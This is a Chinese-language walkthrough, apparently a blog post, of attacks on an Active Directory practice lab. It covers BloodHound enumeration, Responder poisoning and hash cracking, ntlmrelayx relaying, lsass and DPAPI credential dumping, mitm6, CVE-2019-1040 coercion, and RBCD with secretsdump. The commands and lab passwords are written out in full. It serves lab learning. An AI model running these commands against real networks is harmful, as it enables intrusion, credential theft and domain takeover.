  * 用户ACL
    MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
有关bloodhound的更多信息
  * 
  * 
### SharpBloud(Win)
后来我具有rdp权限之后，又在win上导出了数据
在Ubuntu上安装neo4j
远程桌面连接到192.168.56.22 以下是作者的命令 我们直接使用RDP客户端
    xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
运行SharpHound
    .\SharpHound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
    .\SharpHound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
    .\SharpHound.exe -d essos.local -c all --zipfilename bh_essos.zip
在ubuntu上启动neo4j(密码neo4j@123) 启动BloodHound导入zip包
之前BloodHound.py导出后查不到的数据 现在已经可以查到了
### AutoBloody
看到一个微信文章说使用AutoBloody自动利用 这里也试一下
[自动利用 BloodHound 显示的 Active Directory
权限升级路径的工具](https://mp.weixin.qq.com/s/TF_qm60mPg8pTmFle3699w)
    autobloody -u jon.snow -p 'iknownothing' --host winterfell.north.sevenkingdoms.local -dp 'neo4j@123' -ds 'PI:EMAIL' -dt 'NORTH.SEVENKINGDOMS.LOCAL'
报错了
可能是依赖没满足
好了
继续执行
如下，一共有两条路径，第一条的太远，只手动用第二条`path_dict = [pathgen(args)[1]]`
也没成功。。 看来自动域渗透还是任重道远啊
# 0x04 Poison and Relay 投毒和中继
在开始使用用户帐户进行攻击之前，我们将退回到没有用户权限的状态，看看可以用responder、mitm6 和 NTLM 中继做什么
这里相关的知识推荐网上搜一搜或者看一下我推荐的那几本书！
 这个博客说的还可以
## Responder
可以使用Responder获得如下信息：
  * 用户名
  * netntlmv1哈希（如果服务器很旧）/ netntlmv2 哈希
  * 重定向身份验证的能力（NTLM 中继）
在本靶场中，有两个bot(robb和eddard)可以模拟 LLMRN、MDNS 和 NBT-NS 请求。 一位用户的密码很弱，但没有管理员权限。
另一个用户具有管理员权限但使用强密码。
启动Responder
    sudo python Responder.py -I vboxnet0
可见得到了robb.stark的netntlmv2哈希
bot尝试与 bravos 而不是 braavos 建立 smb 连接。 dns 不知道没有两个“a”的 bravos，因此默认情况下 Windows
将发送广播请求以查找关联的计算机。 使用Responder，我们回答那个广播查询并说这个服务器是我们，所以我们从用户那里得到连接。
再过几分钟（eddard 被设置为每 5 分钟运行一次，robb每 3 分钟运行一次）我们也从 eddard.stark 获得了一个连接：
netntlm 哈希不能用于传递哈希，但可以破解它们以找回密码。
> NTLM hash是windows登录密码的一种hash，可以在Windows系统的SAM文件或者域控的NTDS.dit文件中提取到，NTLM
> hash支持哈希传递攻击  
>  Net-NTLM
> hash是网络环境下NTLM认证的hash，该hash不能进行哈希传递，但是可以用于ntlm中继攻击。可以破解。
    robb.stark::NORTH:0876b18a01701f
    eddard.stark::NORTH:d465d8c2f614afeb
    hashcat -m 5600 --force -a 0 responder.hashes rockyou.txt
我们很快得到另一个用户帐户 robb.stark:sexywolfy。 ~~这足以攻击north域，因为其是winterfell（north域）的管理员~~
。（我认为这是WP作者的笔误，eddard才是管理员）  
Eddard的密码比较强，用这个方法是破解不了的。 这并不意味着我们无能为力。 我们可以做的是将 eddard 连接 **中继** 到unsigned
smb 服务器
> Responder 将日志保存在 /opt/tools/Responder/logs（在 exegol 上），如果您需要再次显示它们。
>
> 如果要删除以前捕获的日志（消息跳过以前捕获的哈希）删除文件 /opt/tools/Responder/Responder.db
回顾一下目前的权限：
  * north.sevenkingdoms.local/samwell.tarly:Heartsbane （前边枚举出的 在用户描述里写了密码）
  * north.sevenkingdoms.local/brandon.stark:iseedeadpeople （通过AS-REP Roasting得到的）
  * north.sevenkingdoms.local/hodor:hodor (密码喷洒)
  * north.sevenkingdoms.local/jon.snow:iknownothing（kerberoasting）
  * north.sevenkingdoms.local/robb.stark:sexywolfy （Responder）
## NTLM Relay
### unsigned smb
首先找到`signing:False`的服务器
    cme smb 192.168.56.10-23 --gen-relay-list relay.txt
接下来尝试将ntlm认证中继到这些服务器
### responder + ntlmrelayx to smb
在启动responder对 LLMNR、MDNS 和 NBT-NS 请求的回复投毒之前，我们必须停止responder监听smb 和 http
服务器，因为我们不想直接获取哈希值，但我们想将它们 **中继** 到 ntlmrelayx。
    sed -i 's/HTTP = On/HTTP = Off/g' Responder.conf && cat Responder.conf | grep --color=never 'HTTP ='
    sed -i 's/SMB = On/SMB = Off/g' Responder.conf && cat Responder.conf | grep --color=never 'SMB ='
接下来启动ntlmrelayx
    sudo python ntlmrelayx.py -tf relay.txt -of netntlm -smb2support -socks
        -tf : list of targets to relay the authentication
        -of : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later
        -smb2support : support for smb2
        -socks : will start a socks proxy to use relayed authentication
如果报错的话安装or升级一下依赖包
    pip3 install Flask Jinja2 --upgrade
重新启动Responder
    sudo python Responder.py -I vboxnet0
查看代理
再等一会
  * 投毒连接被中继到了 castelblack (192.168.56.22) 和 essos (192.168.56.23)，并设置了一个 socks 代理来使用该连接。
  * 由于 eddard.stark 是 north.sevenkingdoms.local 的域管理员，他在 castelback (192.168.56.22) 上获得了管理员权限。
现在我们可以使用这个中继以管理员身份访问计算机
### Use a socks relay with an admin account 使用socks代理
分别使用 **Lsassy、DonPapi、Smbclient以及用于命令执行的smbexec或atexec**
首先配置proxychains代理
    /etc/proxychains.conf
    socks5 127.0.0.1 1080
  1. **Lsassy**
  * 使用 lsassy 获取 lsass 进程存储的凭据
  * 域帐户信息存储在 LSASS 进程中，因此转储此进程可以为您提供更多的域帐户和权限。
  * Lsassy 允许您远程转储 lsass（比执行 procdump、下载 lsass 转储文件并在本地执行 pypykatz 或 mimikatz 更方便），它会为您执行所有痛苦的操作，如转储和读取 lsass 内容（它也只转储 lsass 转储的有用部分优化传输时间）。 （lsassy 也作为一个 cme 模块存在）
    proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
2. **DonPapi**
我比较喜欢的用 linux 检索 windows 秘密的工具是 donPAPI，用于获取 dpapi 和其他密码存储信息（ **文件、浏览器、计划任务**
等）。 这个工具不接触 LSASS，所以它更隐蔽，即使在目标上启用了 av 和 edr，它也能在大部分时间工作。
    proxychains python DonPAPI.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
  * DonPapi 给我们存储的 sql 服务 sql_svc:YouWillNotKerboroast1ngMeeeeee 的密码
  * 由于此计算机上的 **计划任务** 设置，我们还获得了 robb.stark 的密码sexywolfy
3. **Smbclient**
使用 smbclient 直接连接到 smbserver
    proxychains python impacket-0.10.0/examples/smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
4.命令执行： **smbexec** or **atexec**
使用socks代理连接，只能使用 smbexec 或 atexec。 wmiexec、psexec 和 dcomexec 都不起作用。
    proxychains python impacket-0.10.0/examples/smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
## Mitm6 + ntlmrelayx to ldap
另一种使网络中毒的有用方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器。
默认情况下，Windows 更喜欢 IPv6 而不是 IPv4，因此我们可以捕获并毒化对 DHCPv6 查询的响应，以更改 DNS 服务器并使用工具
MITM6 将查询重定向到我们的机器。
  * 我们将启动 mitm6 来毒化 dhcpv6 并从主机获取 dns 请求
  * 我注意到我们可以毒化域控制器，但在那之后 DC 不关心并且仍然使用他们的本地主机 dns 服务器。所以我们必须针对服务器(非DC)
  * 对于这个例子，我们将毒化 braavos 服务器。 我们将回答 wpad 查询并将 http 查询中继到 meereen 上的 ldaps，以添加具有委派权限的计算机。（wpad协议  ）
  * 首先我们需要对 braavos.local(SRV03 192.168.56.23) 网络配置做一些小改动（编辑：如果你在 08/18/2022 之后进行了 ansible 配置，则不再需要）
    * 使用 rdp 上的 khal.drogo:horse 连接到 braavos，并将以太网的 dns 服务器更改为自动（我将很快在 ansible 实验室手册中修复它，但现在你必须手动完成）。 仅将第一个以太网连接更改为自动 dns。
可以看到已经设置好了
启动mitm6和ntlmrelayx
    mitm6 -i vboxnet0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
    ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access
可以看到dns已经被投毒了
我们等待 wpad http 查询将请求中继到 ldaps（您可以重新启动 SRV03 以毒害和利用而无需等待）
    vagrant reload SRV03
正常应该是这样
但我这边可以收到wpad的请求 但是一直没成功 要不然python报错 要不然就这样
  * 已创建一台具有委派权限的新计算机relayedpccreate ，因为我们毒化了 Braavos$ 计算机帐户，它可以在创建的计算机上设置 msDS-AllowedToActOnBehalfOfOtherIdentity。
  * 如后续，我们可以继续 RBCD 利用（使用 getST 调用 s4u2proxy）
攻击的逻辑是：
    攻击者控制了服务A（Braavos$）和服务B（relayedpccreate），在服务A上配置了受限委派，在服务B上配置了msDS-AllowedToActOnBehalfOfOtherIdentity=服务A，随后攻击者便能够以服务A的身份调用s4u2proxy协议，获取Braavos$访问relayedpccreate的TGS票据。
  * 如果我们指定一个目录，所有关于 ldap 的信息都会自动转储
    ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
  * 使用essos.local/khal.drogo:horse登录rdp
  * 当中继启动并运行时，我们可以获得所有域信息
我这边也没成功 python又报错了
借用一下WP的图
> 我们可以做的另一件事是像我们对Responder所做的那样也中继到 smb 服务器（但是现在没有bot可以做到这一点）
## Coerced auth smb + ntlmrelayx to ldaps with remove mic (CVE-2019-1040)
旧版mindmap的图
我们可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制从 meereen DC 连接到我们的主机。
我们可以使用刚刚出现的一体式工具 coercer
正如 hackndo 博客 ([en.hackndo.com/ntlm-relay](http://en.hackndo.com/ntlm-relay))
和黑客 receipe (www.thehacker.recipes/ad/movement/ntlm/relay) 中的精彩解释，您不能将 smb
连接中继到 ldap(s)连接而不使用 CVE-2019-1040(remove-mic漏洞)。
  * 使用 remove mic 启动中继到 meereen.essos.local 的 ldaps
    ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access
  * 在 braavos 上运行强制身份验证（braavos 是最新的 windows server 2016，因此 petitpotam unauthenticated 在这里不起作用）
    python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1
不出意料 又报错了
正常下应该
添加了新的计算机
然后使用RBCD渗透braavos
逻辑跟上边描述的类似
    getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'
然后使用ticket获取secret
    export KRB5CCNAME=/workspace/Administrator.ccache
    secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
在下一部分 继续使用已有的账户权限进行渗透（使用SamAccountName和PrintNightMare）